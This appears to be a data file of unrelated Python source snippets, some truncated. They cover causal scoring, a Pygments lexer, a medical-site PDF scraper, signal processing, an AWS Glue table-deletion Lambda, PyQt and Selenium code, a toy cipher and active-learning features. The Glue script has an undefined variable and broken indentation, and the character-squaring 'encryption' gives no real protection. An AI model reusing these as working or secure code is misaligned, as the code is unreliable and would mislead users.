    "import math\nfrom functools import lru_cache\nfrom typing import Any, Callable, Dict, List\n\nimport pandas as pd\nfrom csl.score.LocalScoreFunction import (\n    local_score_BDeu,\n    local_score_BIC,\n    local_score_BIC_from_cov,\n    local_score_cv_general,\n    local_score_cv_multi,\n    local_score_marginal_general,\n    local_score_marginal_multi,\n)\nfrom csl.utils.ScoreUtils import *\nfrom numpy import ndarray\n\n\n# @Weanyq@gmail.com  This code is not robust enough and needs to be improved subsequently. 2022/7/19\nclass LocalScoreClass(object):\n    def __init__(\n        self,\n        data: Any,\n        local_score_fun: Callable[[Any, int, List[int], Any], float],\n        parameters=None,\n    ):\n        self.data = data\n        self.local_score_fun = local_score_fun\n        self.parameters = parameters\n        self.score_cache = {}\n\n        if self.local_score_fun == local_score_BIC_from_cov:\n            self.cov = np.cov(self.data.T)\n            self.n = self.data.shape[0]\n\n    def score(self, i: int, PAi: List[int]) -> float:\n        if i not in self.score_cache:\n            self.score_cache[i] = {}\n\n        hash_key = tuple(sorted(PAi))\n\n        if not self.score_cache[i].__contains__(hash_key):\n            if self.local_score_fun == local_score_BIC_from_cov:\n                self.score_cache[i][hash_key] = self.local_score_fun((self.cov, self.n), i, PAi, self.parameters)\n            else:\n                self.score_cache[i][hash_key] = self.local_score_fun(self.data, i, PAi, self.parameters)\n\n        return self.score_cache[i][hash_key]\n",
    "\"\"\"\n    pygments.lexers.python\n    ~~~~~~~~~~~~~~~~~~~~~~\n\n    Lexers for Python and related languages.\n\n    :copyright: Copyright 2006-2023 by the Pygments team, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n\"\"\"\n\nimport re\nimport keyword\n\nfrom pip._vendor.pygments.lexer import DelegatingLexer, Lexer, RegexLexer, include, \\\n    bygroups, using, default, words, combined, do_insertions, this, line_re\nfrom pip._vendor.pygments.util import get_bool_opt, shebang_matches\nfrom pip._vendor.pygments.token import Text, Comment, Operator, Keyword, Name, String, \\\n    Number, Punctuation, Generic, Other, Error, Whitespace\nfrom pip._vendor.pygments import unistring as uni\n\n__all__ = ['PythonLexer', 'PythonConsoleLexer', 'PythonTracebackLexer',\n           'Python2Lexer', 'Python2TracebackLexer',\n           'CythonLexer', 'DgLexer', 'NumPyLexer']\n\n\nclass PythonLexer(RegexLexer):\n    \"\"\"\n    For Python source code (version 3.x).\n\n    .. versionadded:: 0.10\n\n    .. versionchanged:: 2.5\n       This is now the default ``PythonLexer``.  It is still available as the\n       alias ``Python3Lexer``.\n    \"\"\"\n\n    name = 'Python'\n    url = 'http://www.python.org'\n    aliases = ['python', 'py', 'sage', 'python3', 'py3']\n    filenames = [\n        '*.py',\n        '*.pyw',\n        # Type stubs\n        '*.pyi',\n        # Jython\n        '*.jy',\n        # Sage\n        '*.sage',\n        # SCons\n        '*.sc',\n        'SConstruct',\n        'SConscript',\n        # Skylark/Starlark (used by Bazel, Buck, and Pants)\n        '*.bzl',\n        'BUCK',\n        'BUILD',\n        'BUILD.bazel',\n        'WORKSPACE',\n        # Twisted Application infrastructure\n        '*.tac',\n    ]\n    mimetypes = ['text/x-python', 'application/x-python',\n                 'text/x-python3', 'application/x-python3']\n\n    uni_name = \"[%s][%s]*\" % (uni.xid_start, uni.xid_continue)\n\n    def innerstring_rules(ttype):\n        return [\n            # the old style '%s' % (...) string formatting (still valid in Py3)\n            (r'%(\\(\\w+\\))?[-#0 +]*([0-9]+|[*])?(\\.([0-9]+|[*]))?'\n             '[hlL]?[E-GXc-giorsaux%]', String.Interpol),\n            # the new style '{}'.format(...) string formatting\n            (r'\\{'\n             r'((\\w+)((\\.\\w+)|(\\[[^\\]]+\\]))*)?'  # field name\n             r'(\\![sra])?'                       # conversion\n             r'(\\:(.?[<>=\\^])?[-+ ]?#?0?(\\d+)?,?(\\.\\d+)?[E-GXb-gnosx%]?)?'\n             r'\\}', String.Interpol),\n\n            # backslashes, quotes and formatting signs must be parsed one at a time\n            (r'[^\\\\\\'\"%{\\n]+', ttype),\n            (r'[\\'\"\\\\]', ttype),\n            # unhandled string formatting sign\n            (r'%|(\\{{1,2})', ttype)\n            # newlines are an error (use \"nl\" state)\n        ]\n\n    def fstring_rules(ttype):\n        return [\n            # Assuming that a '}' is the closing brace after format specifier.\n            # Sadly, this means that we won't detect syntax error. But it's\n            # more important to parse correct syntax correctly, than to\n            # highlight invalid syntax.\n            (r'\\}', String.Interpol),\n            (r'\\{', String.Interpol, 'expr-inside-fstring'),\n            # backslashes, quotes and formatting signs must be parsed one at a time\n            (r'[^\\\\\\'\"{}\\n]+', ttype),\n            (r'[\\'\"\\\\]', ttype),\n            # newlines are an error (use \"nl\" state)\n        ]\n\n    tokens = {\n        'root': [\n            (r'\\n', Whitespace),\n            (r'^(\\s*)([rRuUbB]{,2})(\"\"\"(?:.|\\n)*?\"\"\")',\n             bygroups(Whitespace, String.Affix, String.Doc)),\n            (r\"^(\\s*)([rRuUbB]{,2})('''(?:.|\\n)*?''')\",\n             bygroups(Whitespace, String.Affix, String.Doc)),\n            (r'\\A#!.+$', Comment.Hashbang),\n            (r'#.*$', Comment.Single),\n            (r'\\\\\\n', Text),\n            (r'\\\\', Text),\n            include('keywords'),\n            include('soft-keywords'),\n            (r'(def)((?:\\s|\\\\\\s)+)', bygroups(Keyword, Text), 'funcname'),\n            (r'(class)((?:\\s|\\\\\\s)+)', bygroups(Keyword, Text), 'classname'),\n            (r'(from)((?:\\s|\\\\\\s)+)', bygroups(Keyword.Namespace, Text),\n             'fromimport'),\n            (r'(import)((?:\\s|\\\\\\s)+)', bygroups(Keyword.Namespace, Text),\n             'import'),\n            include('expr'),\n        ],\n        'expr': [\n            # raw f-strings\n            ('(?i)(rf|fr)(\"\"\")',\n             bygroups(String.Affix, String.Double),\n             combined('rfstringescape', 'tdqf')),\n            (\"(?i)(rf|fr)(''')\",\n             bygroups(String.Affix, String.Single),\n             combined('rfstringescape', 'tsqf')),\n            ('(?i)(rf|fr)(\")',\n             bygroups(String.Affix, String.Double),\n             combined('rfstringescape', 'dqf')),\n            (\"(?i)(rf|fr)(')\",\n             bygroups(String.Affix, String.Single),\n             combined('rfstringescape', 'sqf')),\n            # non-raw f-strings\n            ('([fF])(\"\"\")', bygroups(String.Affix, String.Double),\n             combined('fstringescape', 'tdqf'",
    "import requests\nfrom bs4 import BeautifulSoup\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport base64\nimport random\nimport string\nimport glob\nimport json\nimport os\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\n\nDOWNLOADPATH = 'download'\n\nclass Login(object):\n    def __init__(self):\n        self.headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'\n        }\n        self.login_url = 'https://www.medlive.cn/auth/login?service=https%3A%2F%2Fwww.medlive.cn%2F'\n        self.post_url = 'https://www.medlive.cn/auth/login?service=https%3A%2F%2Fwww.medlive.cn%2F'\n        self.session = requests.Session()\n    \n    def encrypt(self, word, key):\n        iv = ''.join(random.choices(string.ascii_letters + string.digits, k=16))\n        key = key.encode('utf-8')\n        iv = iv.encode('utf-8')\n        word = word.encode('utf-8')\n        \n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        encrypted = cipher.encrypt(pad(word, AES.block_size))\n        encrypted = base64.b64encode(iv + encrypted)\n        return encrypted.decode('utf-8')\n    \n    def login(self, username, password):\n        response = self.session.get(self.login_url, headers=self.headers)\n        soup = BeautifulSoup(response.text, 'html.parser')\n        \n        lt = soup.find('input', {'name': 'lt'}).get('value')\n        key = soup.find('input', {'id': 'key'}).get('value')\n        \n        data = {\n            \"loginType\": \"password\",\n            \"appName\": \"\",\n            \"lt\": lt,\n            \"execution\": \"e1s1\",\n            \"_eventId\": \"submit\",\n            \"username\": username,\n            \"password\": self.encrypt(password, key),\n            \"tel\": \"\",\n            \"smsCode\": \"\",\n            \"demo-checkbox1\": \"on\",\n            \"rememberMe\": \"true\",\n            \"loginsubmit\": \"\"\n        }\n        \n        response = self.session.post(self.post_url, data=data, headers=self.headers)\n        \n        if response.status_code == 200:\n            print('\u767b\u5f55\u6210\u529f!')\n            # print(response.text)\n\n    def download(self, url, file_name):\n        file_name = file_name.replace('.pdf','') + '.pdf'\n        response = self.session.get(url, headers=self.headers)\n        with open(os.path.join(DOWNLOADPATH,file_name), 'wb') as f:\n            f.write(response.content)\n\ndef download_freefile(login, url, file_name):\n    login.download(url, file_name)\n\n\nif __name__ == '__main__':\n    login = Login()\n    login.login('yourusername', 'yourpassword')\n    repos = glob.glob('data/request.txt_durl.jsonl')\n    print(repos)\n    with ThreadPoolExecutor() as executor:\n        futures = []\n        for repo in repos:\n            with open(repo, 'r') as f:\n                for line in f:\n                    row = json.loads(line)\n                    url = row['download_url']\n                    file_name = row['\u6807\u9898']\n                    futures.append(executor.submit(download_freefile, login, url, file_name))\n\n        for future in as_completed(futures):\n            future.result()\n",
    "import numba\nimport numpy as np\nimport scipy\nimport utils as u\nimport manager as si_manager\n\n\nm = si_manager.Manager()\n\n\nclass SpectralCorrelationEstimator:\n\n    def __init__(self, dft_props):\n\n        win_name = 'hann'\n        # win_name = 'cosine'\n        win = scipy.signal.windows.get_window(win_name, dft_props['nw'], fftbins=True)\n        # print(f\"{win_name = } selected for spectral correlation estimation\")\n\n        if win_name == 'cosine' and dft_props['noverlap'] != dft_props['nw'] // 2:\n            raise ValueError(f'For {win_name = }, {dft_props[\"noverlap\"] = } must be {dft_props[\"nw\"] // 2 = }')\n\n        self.acp_window = win / np.sqrt(np.sum(win ** 2))  # normalize to unit power\n\n        # Condition 3.3.1 in \"Cyclic spectral analysis in practice (2007)\": power calibration\n        assert np.isclose(np.sum(self.acp_window ** 2), 1, atol=1e-3)\n\n        self.dft_props = dft_props\n\n    def run_spectral_correlation_estimators(self, names_scf_estimators, x, dft_props, alpha_max_hz, delta_alpha_dict,\n                                            alpha_min_hz=0, y=None, normalize_scf_to_1=False, coherence=False):\n\n        fs = dft_props['fs']\n        nfft = dft_props['nfft']\n        nw = dft_props['nw']\n        noverlap_samples = dft_props['noverlap']\n\n        # Make a dict containing a dict for each estimator. The key is the name of the estimator.\n        res = {estimator_name: dict() for estimator_name in names_scf_estimators}\n\n        if y is None:\n            y = x\n        else:\n            min_len = min(len(x), len(y))\n            x = x[:min_len]\n            y = y[:min_len]\n\n        sample_cov_dict = {'window': self.acp_window, 'fs_': fs, 'Nw_': nw, 'noverlap_samples_': noverlap_samples,\n                           'complex_stft': False, 'phase_correction': True}\n        x_stft_gio = m.get_stft_phase_corrected(x, **sample_cov_dict)\n        if y is not None:\n            y_stft_gio = m.get_stft_phase_corrected(y, **sample_cov_dict)\n        else:\n            y_stft_gio = x_stft_gio\n\n        # Rescaling so that np.diag(sample_cov) == psd using scipy\n        x_stft_gio[1:-1] *= np.sqrt(2)\n        y_stft_gio[1:-1] *= np.sqrt(2)\n\n        s_sample_cov = x_stft_gio @ y_stft_gio.conj().T / x_stft_gio.shape[1]\n        cpsd_sample_cov = np.diag(s_sample_cov)\n\n        if 'sample_cov' in names_scf_estimators:\n            freqs_sample_cov = np.fft.rfftfreq(nfft, 1 / fs)\n            res['sample_cov']['freqs'] = freqs_sample_cov\n            res['sample_cov']['alphas'] = freqs_sample_cov\n            res['sample_cov']['scf'] = s_sample_cov\n\n        if 'dirichlet' in names_scf_estimators:\n            freqs_dirichlet, alphas_dirichlet, s_scf_dirichlet = (\n                self.compute_dirichlet_cyclic_periodogram(x, y=y, fs_=fs, Nw_=nw, alpha_max=alpha_max_hz,\n                                                          win=self.acp_window))\n\n            res['dirichlet']['freqs'] = freqs_dirichlet\n            res['dirichlet']['alphas'] = alphas_dirichlet\n            res['dirichlet']['scf'] = s_scf_dirichlet\n\n        if 'acp' in names_scf_estimators:\n            freqs_acp, alphas_acp, s_acp, coherence_acp = (\n                self.compute_averaged_cyclic_periodogram(x, y=y, fs_=fs, Nw=nw, nfft=nfft,\n                                                         noverlap_samples_=noverlap_samples,\n                                                         alpha_min_hz=alpha_min_hz,\n                                                         alpha_max_hz=alpha_max_hz,\n                                                         conjugate_scf=False,\n                                                         window=self.acp_window,\n                                                         delta_alpha=delta_alpha_dict['acp'],\n                                                         compute_coherence=coherence))\n            res['acp']['freqs'] = freqs_acp\n            res['acp']['alphas'] = alphas_acp\n            res['acp']['scf'] = s_acp\n            res['acp']['coherence'] = coherence_acp\n\n        if 'psd' in names_scf_estimators:\n            psd = scipy.signal.csd(y, x, fs=fs,\n                                   nperseg=nw,\n                                   nfft=nfft,\n                                   noverlap=noverlap_samples,\n                                   return_onesided=True, scaling='spectrum', detrend=False)[1]\n\n            res['psd']['psd'] = psd\n            res['psd']['freqs'] = np.empty((0,))\n            res['psd']['alphas'] = np.empty((0,))\n            res['psd']['scf'] = np.empty((0,))\n\n        if normalize_scf_to_1:\n            for estimator_name in res.keys():\n                if res[estimator_name]['scf'] is not None:\n                    res[estimator_name]['scf'] = res[estimator_name]['scf'] / np.max(res[estimator_name]['scf'])\n\n        # Use the same PSD for all estimators, so that we can compare them more easily.\n        for key in res.keys():\n            res[key]['psd'] = cpsd_sample_cov\n            # if key != 'sample_cov' and ke",
    "'''\n    Telma Frege (tfrege@gmail.com)\n    \n    This script takes a list of patterns to look for in the table names and deletes them.\n    The max number of tables to be retrieved for each pattern is 100 (AWS API's get_tables() hard limit). To work around this, you can add the same pattern multiple times on the TABLE_NAME_PATTERNS list.\n    Requisites:\n    1. If running this from AWS Lambda: verify the function has a good timeout (not the default 3 secs)\n    2. The Lambda role should have the following permissions: \n    3. Have logging enabled (i.e. a CloudWatch log if running this as a Lambda function)\n'''\n\nimport json\nimport boto3\nimport botocore\n\nglue_client         = boto3.client('glue')\n\nGLUE_DATA_CATALOG   = 'AwsDataCatalog'\nGLUE_DB_NAME        = 'mygluedb'\nTABLE_NAME_PATTERNS = ['pattern1_', '_pattern2_']\n\ndef verify_tables(db_name):\n    response = []\n    try:\n        for pattern in TABLE_NAME_PATTERNS:\n            print(\"SEARCHING TABLES WITH THE PATTERN: \" + pattern)\n            response = glue_client.get_tables(DatabaseName=db_name, MaxResults=100, Expression='*['+pattern+']*')\n            print(\"FOUND A TOTAL OF \" + str(len(response[\"TableList\"])))\n    except botocore.exceptions.ClientError as err:\n        print(\n            \"Couldn't get tables %s. Here's why: %s: %s\",\n            db_name,\n            err.response[\"Error\"][\"Code\"],\n            err.response[\"Error\"][\"Message\"],\n        )\n        raise\n\n    return response\n    \ndef delete_tables(db_name):\n    response = []\n    try:\n        for pattern in TABLE_NAME_PATTERNS:\n            print(\"SEARCHING TABLES WITH PREFIX: \" + pattern)\n            response = glue_client.get_tables(DatabaseName=db_name, MaxResults=100, Expression='*['+pattern+']*')\n            print(\"FOUND A TOTAL OF \" + str(len(response[\"TableList\"])))\n            count = 0\n            for table in tables:\n                delete_table(table['Name'])\n    except botocore.exceptions.ClientError as err:\n        print(\n            \"Couldn't get tables %s. Here's why: %s: %s\",\n            db_name,\n            err.response[\"Error\"][\"Code\"],\n            err.response[\"Error\"][\"Message\"],\n        )\n        raise\n\n    return response\n\ndef delete_table(table_name):\n    print(\"DELETING... \" + table_name)\n    glue_client.delete_table(\n        DatabaseName=GLUE_DB_NAME,\n        Name=table_name\n    )\n    \ndef lambda_handler(event, context):\n  # Recommended: first run verify_tables to make sure the code is selecting the tables you want to delete, then uncomment delete_tables()\n  verify_tables(GLUE_DB_NAME)\n   # delete_tables(GLUE_DB_NAME)\n    \n    \n    \n    return {\n        'statusCode': 200,\n        'body': json.dumps('Done!')\n    }\n",
    "# Form implementation generated from reading ui file 'main_window.ui'\n#\n# Created by: PyQt6 UI code generator 6.4.2\n#\n# WARNING: Any manual changes made to this file will be lost when pyuic6 is\n# run again.  Do not edit this file unless you know what you are doing.\n\n\nfrom PyQt6 import QtCore, QtGui, QtWidgets\n\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.resize(337, 450)\n        self.centralwidget = QtWidgets.QWidget(parent=MainWindow)\n        self.centralwidget.setObjectName(\"centralwidget\")\n        self.label = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label.setGeometry(QtCore.QRect(10, 10, 71, 16))\n        self.label.setObjectName(\"label\")\n        self.label_2 = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_2.setGeometry(QtCore.QRect(10, 40, 71, 20))\n        self.label_2.setObjectName(\"label_2\")\n        self.lineEdit_url = QtWidgets.QLineEdit(parent=self.centralwidget)\n        self.lineEdit_url.setGeometry(QtCore.QRect(70, 10, 251, 21))\n        self.lineEdit_url.setObjectName(\"lineEdit_url\")\n        self.lineEdit_interval = QtWidgets.QLineEdit(parent=self.centralwidget)\n        self.lineEdit_interval.setGeometry(QtCore.QRect(70, 40, 91, 21))\n        self.lineEdit_interval.setObjectName(\"lineEdit_interval\")\n        self.textEdit_log = QtWidgets.QTextEdit(parent=self.centralwidget)\n        self.textEdit_log.setGeometry(QtCore.QRect(10, 130, 321, 311))\n        self.textEdit_log.setReadOnly(True)\n        self.textEdit_log.setObjectName(\"textEdit_log\")\n        self.label_3 = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_3.setGeometry(QtCore.QRect(10, 110, 61, 16))\n        self.label_3.setObjectName(\"label_3\")\n        self.label_4 = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_4.setGeometry(QtCore.QRect(10, 90, 81, 16))\n        self.label_4.setObjectName(\"label_4\")\n        self.label_TimesOfChange = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_TimesOfChange.setGeometry(QtCore.QRect(70, 90, 51, 16))\n        self.label_TimesOfChange.setObjectName(\"label_TimesOfChange\")\n        self.pushButton_operator = QtWidgets.QPushButton(parent=self.centralwidget)\n        self.pushButton_operator.setGeometry(QtCore.QRect(270, 70, 61, 51))\n        self.pushButton_operator.setObjectName(\"pushButton_operator\")\n        self.label_6 = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_6.setGeometry(QtCore.QRect(10, 70, 81, 16))\n        self.label_6.setObjectName(\"label_6\")\n        self.label_startTime = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_startTime.setGeometry(QtCore.QRect(69, 70, 141, 16))\n        self.label_startTime.setObjectName(\"label_startTime\")\n        self.label_status = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_status.setGeometry(QtCore.QRect(190, 30, 141, 31))\n        font = QtGui.QFont()\n        font.setPointSize(20)\n        self.label_status.setFont(font)\n        self.label_status.setStyleSheet(\"color:rgb(1, 255, 81)\")\n        self.label_status.setObjectName(\"label_status\")\n        self.label_5 = QtWidgets.QLabel(parent=self.centralwidget)\n        self.label_5.setGeometry(QtCore.QRect(160, 40, 21, 20))\n        self.label_5.setObjectName(\"label_5\")\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menuBar = QtWidgets.QMenuBar(parent=MainWindow)\n        self.menuBar.setGeometry(QtCore.QRect(0, 0, 337, 21))\n        self.menuBar.setObjectName(\"menuBar\")\n        self.menu = QtWidgets.QMenu(parent=self.menuBar)\n        self.menu.setObjectName(\"menu\")\n        self.about_menu = QtWidgets.QMenu(parent=self.menuBar)\n        self.about_menu.setObjectName(\"about_menu\")\n        MainWindow.setMenuBar(self.menuBar)\n        self.actionAbout = QtGui.QAction(parent=MainWindow)\n        self.actionAbout.setObjectName(\"actionAbout\")\n        self.about_menu.addAction(self.actionAbout)\n        self.menuBar.addAction(self.menu.menuAction())\n        self.menuBar.addAction(self.about_menu.menuAction())\n\n        self.retranslateUi(MainWindow)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        _translate = QtCore.QCoreApplication.translate\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"\u7f51\u9875\u53d8\u52a8\u76d1\u63a7\u5de5\u5177\"))\n        self.label.setText(_translate(\"MainWindow\", \"\u68c0\u6d4b\u7f51\u5740\uff1a\"))\n        self.label_2.setText(_translate(\"MainWindow\", \"\u68c0\u6d4b\u95f4\u9694:\"))\n        self.label_3.setText(_translate(\"MainWindow\", \"\u76d1\u63a7\u65e5\u5fd7\uff1a\"))\n        self.label_4.setText(_translate(\"MainWindow\", \"\u53d8\u5316\u6b21\u6570\uff1a\"))\n        self.label_TimesOfChange.setText(_translate(\"MainWindow\", \"0\"))\n        self.pushButton_operator.setText(_translate(\"MainWindow\", \"\u5f00\u59cb\"))\n        self.label_6.setText(_translate(\"MainWindow\", \"\u5f00\u59cb\u65f6\u95f4\uff1a\"))\n        self.label_startTime.setText(_translate(\"MainWindow\", \"\u76d1\u63a7\u672a\u5f00\u59cb\"))\n        self.label_status.setText(_translate(\"MainWindow\", \"\u76d1\u63a7\u672a\u5f00\u59cb\"))\n        self.label_5.setText(_translate(\"M",
    "from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.wait import WebDriverWait #ilgili driver\u0131 bekleten yap\u0131\r\nfrom selenium.webdriver.support import expected_conditions as ec #beklenen ko\u015fullar\r\nfrom selenium.webdriver.common.action_chains import ActionChains \r\nimport pytest\r\nfrom constants.globalConstants import *\r\nimport json\r\n\r\nclass Test_Demo:\r\n    def deneme(self):\r\n        print(\"deneme\")\r\n\r\n    #pytest taraf\u0131ndan tan\u0131mlanan bir method \r\n    #her test \u00f6ncesi otomatik olarak \u00e7al\u0131\u015ft\u0131r\u0131l\u0131r\r\n    def setup_method(self):\r\n        self.driver = webdriver.Chrome()\r\n        self.driver.maximize_window()\r\n        self.driver.get(BASE_URL)\r\n\r\n    #her test bitiminde \u00e7al\u0131\u015facak fonk\r\n    def teardown_method(self):\r\n        self.driver.quit()\r\n\r\n    @pytest.mark.skip #t\u00fcm testler ko\u015fulurken \"skip\" \u015feklinde i\u015faretlenen testlerimi atl\r\n    def test_demo(self):\r\n        print(\"x\")\r\n        text = \"Hello\"\r\n        assert text == \"Hello\"\r\n\r\n    def getData():\r\n        return [(\"1\",\"1\"),(\"abc\",\"123\"),(\"deneme\",\"secret_sauce\")]\r\n    \r\n   \r\n            \r\n    def readInvalidDataFromJSON(json_file_path):\r\n     with open(json_file_path, 'r') as file:\r\n        data = json.load(file)\r\n        invalid_users = data.get('invalid_login_users', [])\r\n        return [(user.get('username'), user.get('password')) for user in invalid_users]\r\n\r\n\r\n\r\n\r\n\r\n    # def readInvalidDataFromExcel():\r\n    #     excelFile = openpyxl.load_workbook(\"data/invalidLogin.xlsx\")\r\n    #     sheet = excelFile[\"Sheet1\"]\r\n    #     rows = sheet.max_row #ka\u00e7\u0131nc\u0131 sat\u0131ra kadar benim verim var\r\n    #     data = []\r\n    #     for i in range(2,rows+1):\r\n    #         username = sheet.cell(i,1).value\r\n    #         password = sheet.cell(i,2).value\r\n    #         data.append((username,password))\r\n    #     return data\r\n    \r\n\r\n    \r\n    \r\n    @pytest.mark.parametrize(\"username, password\", readInvalidDataFromJSON(\"invalid/data.json\"))\r\n    def test_invalid_login(self,username,password):\r\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\r\n        passwordInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\r\n        userNameInput.send_keys(username)\r\n        passwordInput.send_keys(password)\r\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\r\n        loginButton.click()\r\n        errorMessage =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,errorMessage_xpath)))\r\n        assert errorMessage.text == errorMessage_text\r\n\r\n\r\n    def test_valid_login(self):\r\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\r\n        passwordInput =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\r\n        actions = ActionChains(self.driver)\r\n        actions.send_keys_to_element(userNameInput,\"standard_user\")\r\n        actions.send_keys_to_element(passwordInput,\"secret_sauce\")\r\n        actions.perform() #depolad\u0131\u011f\u0131m aksiyonlar\u0131 \u00e7al\u0131\u015ft\u0131r\r\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\r\n        loginButton.click()\r\n        baslik =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,baslik_xpath)))\r\n        assert baslik.text == baslik_text\r\n    \r\n    def waitForElementVisible(self,locator,timeout=5):\r\n       return WebDriverWait(self.driver,timeout).until(ec.visibility_of_element_located(locator))",
    "# import important libraries\nimport argparse\nimport math\n\n# encryption function\ndef encrypt(input_file, output_file):\n\n    print(\"Encrypting file:\", input_file, \"to\", output_file)\n\n    # open and read the file we want to encrypt\n    with open(input_file, \"r\", encoding=\"utf-8\") as file:\n        file_content = file.read()\n\n    result = \"\"\n\n    # in this loop:\n    # every letter have a number in ASCII\n    # we power this number to 2 and return back as char\n    \n    for i in file_content:\n    \tshifted = ord(i) ** 2\n    \tresult += chr(shifted)\n    \n    # then we store the output into the output file\n    with open(output_file, \"a\", encoding=\"utf-8\") as file:\n        file.write(result)\n\n    print(\"file: \", input_file, \" Encrypted to: \", output_file)\n\n# decryption function\ndef decrypt(input_file, output_file):\n    \n    print(\"Decrypting file:\", input_file, \"to\", output_file)\n\n    # open and read the encrypted file\n    with open(input_file, \"r\", encoding=\"utf-8\") as file:\n        file_content = file.read()\n\n    result = \"\"\n\n    # in this loop we take the squar of the letter in the encrypted file\n    # so we get the original value which we have powered it to 2\n    # and retuen the number to letter again\n    for i in file_content:\n    \tshifted = int(math.sqrt(ord(i)))\n    \tresult += chr(shifted)\n\n    # store the decrypted data into the output file\n    with open(output_file, \"a\", encoding=\"utf-8\") as file:\n        file.write(result)\n\n    print(\"file: \", input_file, \" Decrypted to: \", output_file)\n\n# main function\ndef main():\n    # declear the flags and argements\n    parser = argparse.ArgumentParser(\n        prog='\\033[1;34mDR. Crypto\\n\\033[0m',\n        description='encrypt or decrypt any file you want')\n    parser.add_argument(\"-i\", \"--input\", help=\"the file to encrypt/decrypt\")\n    parser.add_argument(\"-e\", \"--encrypt\", action=\"store_true\", help=\"Encrypt the file\")\n    parser.add_argument(\"-d\", \"--decrypt\", action=\"store_true\", help=\"Decrypt the file\")\n    parser.add_argument(\"-o\", \"--output\", help=\"where is the output file\")\n    args = parser.parse_args()\n\n    # check what user add and send them to functions to do his work\n    if args.encrypt:\n        if args.output:\n            encrypt(args.input, args.output)\n        else:\n            print(\"Please specify the input and output file using -i and -o option. \\nex: -i input.txt -o output.txt\")\n    elif args.decrypt:\n        if args.output:\n            decrypt(args.input, args.output)\n        else:\n            print(\"Please specify the input and output file using -i and -o option. \\nex: -i input.txt -o output.txt\")\n    else:\n        print(\"Please specify either -e or -d option.\\ntry flag -h to learn more\")\n   \n# run the script     \nmain()\n    \n    \n",
    "import os,torch,datetime\nimport random\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.utils.data as data\nfrom tqdm import tqdm\nimport numpy as np\nfrom utils.utils import set_random_seed, normalize,AverageMeter\nfrom scipy.stats import entropy\n\nerror_k = torch.topk\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n# hflip = TL.HorizontalFlipLayer().to(device)\n\n\n\ndef Select_selector(select_indices, score,args):\n    # this select best samples based on the scores\n    score = torch.tensor(score)\n    finally_selector, query_inside = torch.topk(score,args.target)\n    query_inside = query_inside.cpu().data\n    finally_indices = np.asarray(select_indices)[query_inside]\n\n    return finally_indices, finally_selector\n\n\n\n\n\ndef get_scores_similarity(P, feats_dict,labels):\n    \"\"\"\n    :param P:it contains axis attribute contain mean on sample axis of feature data from a class for which we want simlarity score\n    :param feats_dict: contain features of unlabeld data\n    :param labels: contain labeles of each element in train data for which feature is passed in P.axis\n    :return: similarty score and label of that most similar sample from traning data using indexies\n    \"\"\"\n    # convert to gpu tensor\n    feats_sim = feats_dict['simclr'].to(device)#[1600, 40, 128]\n    # if \"shift\" in feats_dict: feats_shi = feats_dict['shift'].to(device)#[1600, 40, 4]\n    N = feats_sim.size(0)\n\n    # compute scores\n    maxs = []\n    labels_similarity = []\n\n    for i in range(len(feats_sim)):\n        # terverse the unlabled features 1 by 1\n        # calculate the mean at 1 dimention and normalize that\n        f_sim = [normalize(f.mean(dim=0, keepdim=True), dim=1) for f in feats_sim[i].chunk(P.K_shift)]  # list of (1, d)\n\n        max_simi = 0\n        # Calculate the Similarity score between training feature and Unlabled Feature All saved max_smi\n        value_sim, indices_sim = ((f_sim[0] * P.axis[0]).sum(dim=1)).sort(descending=True)\n        max_simi += value_sim.max().item() * P.weight_sim[0]\n        labels_similarity.append(labels[indices_sim[0].item()])\n        maxs.append(max_simi)\n    maxs = torch.tensor(maxs)\n    labels_similarity = torch.tensor(labels_similarity)\n\n    assert maxs.dim() == 1 and maxs.size(0) == N  # (N)\n    return maxs.cpu(),labels_similarity.cpu()\n\n\ndef get_features(P, Data_set,indecies,batch_size,model_similarity=None, sample_num=1, layers=('simclr', 'shift')):\n\n    if not isinstance(layers, (list, tuple)): layers = [layers]\n    labels,feats_dict_similarity,index = _get_features(P,Data_set, indecies,batch_size, sample_num,model_similarity, layers=layers)\n    return labels,feats_dict_similarity,index\n\n\ndef _get_features(P, Data_set, indecies,batch_size, sample_num=1,model_similarity=None, layers=('simclr', 'shift')):\n    # return the calculated feature on Augmented data of  similarity models\n    # retun shape is feats_all_distinctive,labels,feats_all_similarity,index and\n    # feats_all_distinctive and feats_all_similarity shape is (N,sample_num,featureOutputShape) N is Number DataSamples in indecies\n    if not isinstance(layers, (list, tuple)):\n        layers = [layers]\n\n    # compute features in full dataset\n    labels,index = 